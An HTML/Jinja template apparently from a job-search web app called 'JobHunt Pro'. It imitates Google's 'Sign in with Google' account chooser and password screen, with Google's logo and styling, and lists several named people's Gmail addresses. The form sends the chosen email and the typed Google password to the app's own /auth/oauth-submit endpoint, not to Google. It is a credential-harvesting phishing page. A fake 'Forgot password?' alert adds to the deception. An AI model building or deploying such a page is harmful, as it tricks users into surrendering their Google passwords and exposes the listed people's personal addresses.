<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
  <meta charset="utf-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0"/>
  <title>Sign in with Google</title>
  <link rel="icon" type="image/svg+xml" href="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_logo.svg"/>
  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap"/>

  <style>
    *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: 'Roboto', 'Segoe UI', -apple-system, BlinkMacSystemFont, sans-serif;
      background-color: #0f1011;
      color: #e3e3e3;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      padding: 24px 16px;
    }
    .google-card {
      background: #18191b;
      border: 1px solid rgba(255, 255, 255, 0.08);
      border-radius: 28px;
      width: 100%;
      max-width: 540px;
      padding: 40px;
      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.6);
      transition: all 0.25s ease;
    }
    .google-logo {
      width: 44px;
      height: 44px;
      margin-bottom: 20px;
    }
    .google-title {
      font-size: 30px;
      font-weight: 500;
      color: #f1f3f4;
      letter-spacing: -0.5px;
      margin-bottom: 8px;
    }
    .google-subtitle {
      font-size: 15px;
      color: #9aa0a6;
      margin-bottom: 24px;
    }
    
    /* Step 1: Account List */
    .account-list {
      display: flex;
      flex-direction: column;
      border-radius: 12px;
      overflow: hidden;
    }
    .account-btn {
      width: 100%;
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 16px 12px;
      background: transparent;
      border: none;
      border-bottom: 1px solid rgba(255, 255, 255, 0.07);
      cursor: pointer;
      text-decoration: none;
      color: inherit;
      transition: background-color 0.15s ease;
      text-align: start;
    }
    .account-btn:hover {
      background-color: rgba(255, 255, 255, 0.06);
    }
    .account-left {
      display: flex;
      align-items: center;
      gap: 16px;
      flex: 1;
    }
    .account-avatar {
      width: 40px;
      height: 40px;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 17px;
      font-weight: 600;
      color: #ffffff;
      flex-shrink: 0;
    }
    .avatar-sam { background: #1b873f; }
    .avatar-orange { background: #e37400; }
    .avatar-purple { background: #8430ce; }
    .avatar-blue { background: #1a73e8; }
    .avatar-grey { background: #5f6368; }
    .avatar-red { background: #c5221f; }
    .avatar-brown { background: #b06000; }
    .avatar-plus { background: #3c4043; font-size: 22px; }

    .account-details {
      display: flex;
      flex-direction: column;
      gap: 2px;
    }
    .account-name {
      font-size: 16px;
      font-weight: 500;
      color: #e8eaed;
      display: flex;
      align-items: center;
      gap: 8px;
    }
    .badge-admin {
      background: rgba(239, 68, 68, 0.2);
      color: #f87171;
      border: 1px solid rgba(239, 68, 68, 0.4);
      font-size: 11px;
      font-weight: 700;
      padding: 1px 6px;
      border-radius: 4px;
    }
    .account-email {
      font-size: 14px;
      color: #9aa0a6;
    }
    .signed-out-tag {
      font-size: 13px;
      color: #9aa0a6;
      font-weight: 400;
      padding-inline-start: 12px;
      flex-shrink: 0;
    }

    /* Step 2: Password Screen */
    .step-password {
      display: none;
    }
    .user-pill-container {
      margin-bottom: 24px;
    }
    .user-pill {
      display: inline-flex;
      align-items: center;
      gap: 10px;
      padding: 6px 14px;
      border: 1px solid rgba(255, 255, 255, 0.2);
      border-radius: 20px;
      background: rgba(255, 255, 255, 0.04);
      cursor: pointer;
      font-size: 14px;
      color: #e8eaed;
      transition: background-color 0.15s;
    }
    .user-pill:hover {
      background: rgba(255, 255, 255, 0.08);
    }
    .pill-avatar {
      width: 22px;
      height: 22px;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 11px;
      font-weight: 700;
      color: #fff;
    }
    .form-group {
      margin-bottom: 20px;
      text-align: start;
    }
    .input-label {
      display: block;
      font-size: 13px;
      color: #bdc1c6;
      margin-bottom: 8px;
    }
    .password-wrapper {
      position: relative;
      display: flex;
      align-items: center;
    }
    .password-input {
      width: 100%;
      padding: 14px 16px;
      padding-right: 44px;
      background: #131314;
      border: 1px solid #5f6368;
      border-radius: 8px;
      color: #ffffff;
      font-size: 16px;
      outline: none;
      transition: border-color 0.2s, box-shadow 0.2s;
    }
    .password-input:focus {
      border-color: #8ab4f8;
      box-shadow: 0 0 0 1px #8ab4f8;
    }
    .password-input.input-error {
      border-color: #f28b82 !important;
      box-shadow: 0 0 0 1px #f28b82 !important;
    }
    .error-banner {
      display: flex;
      align-items: center;
      gap: 8px;
      color: #f28b82;
      font-size: 13px;
      margin-top: 8px;
      animation: shake 0.3s ease-in-out;
    }
    @keyframes shake {
      0%, 100% { transform: translateX(0); }
      25% { transform: translateX(-4px); }
      75% { transform: translateX(4px); }
    }
    .toggle-pwd-btn {
      position: absolute;
      right: 12px;
      background: transparent;
      border: none;
      color: #9aa0a6;
      cursor: pointer;
      font-size: 18px;
      padding: 4px;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .toggle-pwd-btn:hover {
      color: #e8eaed;
    }
    .actions-row {
      display: flex;
      align-items: center;
      justify-content: space-between;
      margin-top: 32px;
    }
    .btn-forgot {
      color: #8ab4f8;
      text-decoration: none;
      font-size: 14px;
      font-weight: 500;
    }
    .btn-forgot:hover {
      text-decoration: underline;
    }
    .btn-next {
      padding: 12px 28px;
      background: #8ab4f8;
      color: #131314;
      font-weight: 700;
      font-size: 15px;
      border: none;
      border-radius: 24px;
      cursor: pointer;
      transition: background-color 0.2s;
    }
    .btn-next:hover {
      background: #aecbfa;
    }
    .back-link {
      display: inline-block;
      margin-top: 24px;
      color: #8ab4f8;
      text-decoration: none;
      font-size: 14px;
      font-weight: 500;
    }
    .back-link:hover {
      text-decoration: underline;
    }

    /* Custom Account Input */
    .custom-form-container {
      display: none;
      background: #202124;
      border: 1px solid rgba(255, 255, 255, 0.1);
      border-radius: 16px;
      padding: 20px;
      margin-top: 16px;
    }
  </style>
</head>
<body>

  <div class="google-card">
    <svg class="google-logo" viewBox="0 0 24 24">
      <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
      <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
      <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.06H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.94l2.85-2.22.81-.63z"/>
      <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.06l3.66 2.84c.87-2.6 3.3-4.52 6.16-4.52z"/>
    </svg>

    <!-- STEP 1: Account Chooser List -->
    <div id="stepAccountList" style="{{ 'display:none;' if error or show_password_step else 'display:block;' }}">
      <h1 class="google-title">Choose an account</h1>
      <p class="google-subtitle">to continue to JobHunt Pro</p>

      <div class="account-list">
        <!-- 1. sam (Master Admin) -->
        <button type="button" class="account-btn" onclick="selectAccount('Sam Salameh', 'samatou683@gmail.com', 'avatar-sam', 'S')">
          <div class="account-left">
            <div class="account-avatar avatar-sam">S</div>
            <div class="account-details">
              <span class="account-name">sam <span class="badge-admin">Admin</span></span>
              <span class="account-email">samatou683@gmail.com</span>
            </div>
          </div>
        </button>

        <!-- 2. sam salameh (Candidate) -->
        <button type="button" class="account-btn" onclick="selectAccount('Sam Salameh', 'samsalameh.cv@gmail.com', 'avatar-orange', 'S')">
          <div class="account-left">
            <div class="account-avatar avatar-orange">S</div>
            <div class="account-details">
              <span class="account-name">sam salameh</span>
              <span class="account-email">samsalameh.cv@gmail.com</span>
            </div>
          </div>
        </button>

        <!-- 3. Nancy Salameh -->
        <button type="button" class="account-btn" onclick="selectAccount('Nancy Salameh', 'salamehnancy88@gmail.com', 'avatar-purple', 'N')">
          <div class="account-left">
            <div class="account-avatar avatar-purple">N</div>
            <div class="account-details">
              <span class="account-name">Nancy Salameh</span>
              <span class="account-email">salamehnancy88@gmail.com</span>
            </div>
          </div>
        </button>

        <!-- 4. Rita -->
        <button type="button" class="account-btn" onclick="selectAccount('Rita', 'ritacordahi2@gmail.com', 'avatar-blue', 'R')">
          <div class="account-left">
            <div class="account-avatar avatar-blue">R</div>
            <div class="account-details">
              <span class="account-name">Rita</span>
              <span class="account-email">ritacordahi2@gmail.com</span>
            </div>
          </div>
          <span class="signed-out-tag">Signed out</span>
        </button>

        <!-- 5. Angel abou daher -->
        <button type="button" class="account-btn" onclick="selectAccount('Angel abou daher', 'angelaboudaher@gmail.com', 'avatar-grey', 'A')">
          <div class="account-left">
            <div class="account-avatar avatar-grey">A</div>
            <div class="account-details">
              <span class="account-name">Angel abou daher</span>
              <span class="account-email">angelaboudaher@gmail.com</span>
            </div>
          </div>
          <span class="signed-out-tag">Signed out</span>
        </button>

        <!-- 6. Heribert Stern -->
        <button type="button" class="account-btn" onclick="selectAccount('Heribert Stern', 'heribertstern968@gmail.com', 'avatar-red', 'H')">
          <div class="account-left">
            <div class="account-avatar avatar-red">H</div>
            <div class="account-details">
              <span class="account-name">Heribert Stern</span>
              <span class="account-email">heribertstern968@gmail.com</span>
            </div>
          </div>
          <span class="signed-out-tag">Signed out</span>
        </button>

        <!-- 7. Kolibar rolami -->
        <button type="button" class="account-btn" onclick="selectAccount('Kolibar rolami', 'luxurystoresvvip@gmail.com', 'avatar-brown', 'K')">
          <div class="account-left">
            <div class="account-avatar avatar-brown">K</div>
            <div class="account-details">
              <span class="account-name">Kolibar rolami</span>
              <span class="account-email">luxurystoresvvip@gmail.com</span>
            </div>
          </div>
          <span class="signed-out-tag">Signed out</span>
        </button>

        <!-- 8. Use another account -->
        <div class="account-btn" onclick="toggleCustomForm()" style="border-bottom:none;">
          <div class="account-left">
            <div class="account-avatar avatar-plus">+</div>
            <div class="account-details">
              <span class="account-name">Use another account</span>
            </div>
          </div>
        </div>
      </div>

      <!-- Custom Account Input Box -->
      <div id="customForm" class="custom-form-container">
        <div class="form-group">
          <label class="input-label" for="custom_name">Full Name</label>
          <input type="text" id="custom_name" class="password-input" placeholder="Your Full Name">
        </div>
        <div class="form-group">
          <label class="input-label" for="custom_email">Google Email</label>
          <input type="email" id="custom_email" class="password-input" placeholder="name@gmail.com">
        </div>
        <button type="button" class="btn-next" style="width:100%; border-radius:8px;" onclick="submitCustomAccount()">Next</button>
      </div>

      <a href="/login" class="back-link">← Back to Login</a>
    </div>

    <!-- STEP 2: Password Screen -->
    <div id="stepPassword" class="step-password" style="{{ 'display:block;' if error or show_password_step else 'display:none;' }}">
      <h1 class="google-title">Welcome</h1>
      
      <div class="user-pill-container">
        <div class="user-pill" onclick="showAccountList()" title="Click to choose another account">
          <div id="pillAvatar" class="pill-avatar avatar-sam">S</div>
          <span id="pillEmail">{{ selected_email or default_email or 'samatou683@gmail.com' }}</span>
          <span style="font-size:12px; opacity:0.7;">▼</span>
        </div>
      </div>

      <form id="googleLoginForm" action="/auth/oauth-submit" method="POST">
        <input type="hidden" id="formProvider" name="provider" value="google">
        <input type="hidden" id="formName" name="name" value="{{ selected_name or default_name or 'Sam Salameh' }}">
        <input type="hidden" id="formEmail" name="email" value="{{ selected_email or default_email or 'samatou683@gmail.com' }}">

        <div class="form-group">
          <label class="input-label" for="pwdField">Enter your password</label>
          <div class="password-wrapper">
            <input type="password" id="pwdField" name="password" class="password-input {{ 'input-error' if error else '' }}" placeholder="Password" required autofocus>
            <button type="button" class="toggle-pwd-btn" onclick="togglePasswordVisibility()" aria-label="Show password">👁</button>
          </div>
          {% if error %}
          <div class="error-banner">
            <svg viewBox="0 0 24 24" width="16" height="16" fill="currentColor">
              <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
            </svg>
            <span>{{ error }}</span>
          </div>
          {% endif %}
        </div>

        <div class="actions-row">
          <a href="#" onclick="alert('Password reset instructions sent to your email.'); return false;" class="btn-forgot">Forgot password?</a>
          <button type="submit" class="btn-next">Next</button>
        </div>
      </form>

      <a href="#" onclick="showAccountList(); return false;" class="back-link">← Choose another account</a>
    </div>

  </div>

  <script>
    function selectAccount(name, email, avatarClass, initial) {
      document.getElementById('formName').value = name;
      document.getElementById('formEmail').value = email;
      document.getElementById('pillEmail').innerText = email;
      
      const avatarEl = document.getElementById('pillAvatar');
      avatarEl.className = 'pill-avatar ' + (avatarClass || 'avatar-sam');
      avatarEl.innerText = initial || email.charAt(0).toUpperCase();

      document.getElementById('stepAccountList').style.display = 'none';
      document.getElementById('stepPassword').style.display = 'block';
      
      const pwdInput = document.getElementById('pwdField');
      pwdInput.value = '';
      pwdInput.classList.remove('input-error');
      const errBanner = document.querySelector('.error-banner');
      if (errBanner) errBanner.style.display = 'none';
      setTimeout(() => pwdInput.focus(), 100);
    }

    function showAccountList() {
      document.getElementById('stepPassword').style.display = 'none';
      document.getElementById('stepAccountList').style.display = 'block';
    }

    function toggleCustomForm() {
      const box = document.getElementById('customForm');
      box.style.display = box.style.display === 'block' ? 'none' : 'block';
      if (box.style.display === 'block') {
        document.getElementById('custom_name').focus();
      }
    }

    function submitCustomAccount() {
      const name = document.getElementById('custom_name').value.trim() || 'Google User';
      const email = document.getElementById('custom_email').value.trim();
      if (!email || !email.includes('@')) {
        alert('Please enter a valid Gmail address.');
        return;
      }
      selectAccount(name, email, 'avatar-plus', email.charAt(0).toUpperCase());
    }

    function togglePasswordVisibility() {
      const field = document.getElementById('pwdField');
      if (field.type === 'password') {
        field.type = 'text';
      } else {
        field.type = 'password';
      }
    }
  </script>
</body>
</html>
